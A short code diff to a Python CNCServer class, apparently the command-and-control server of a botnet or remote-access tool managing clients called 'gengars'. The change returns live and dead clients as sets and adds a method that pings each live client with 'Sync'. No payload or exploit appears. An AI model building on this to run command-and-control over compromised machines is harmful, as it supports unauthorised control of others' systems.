@@ -2,6 +2,7 @@ import socket
 import threading
 from dataclasses import dataclass
 
+
 import output
 from gengar import Gengar, GengarAuthenticationFailed
 from logger import logger
@@ -19,11 +20,15 @@ class CNCServer:
 
     @property
     def gengars(self):
-        return [gengar for gengar in self._gengars if gengar.alive]
+        return set([gengar for gengar in self._gengars if gengar.alive])
 
     @property
     def dead_gengars(self):
-        return [gengar for gengar in self._gengars if not gengar.alive]
+        return set([gengar for gengar in self._gengars if not gengar.alive])
+
+    def assure_gengars_connected(self):
+        for gengar in self.gengars:
+            gengar.echo('Sync')
 
     def start(self):
         logger.info(f'Starting the CNC server at :{self.port}')
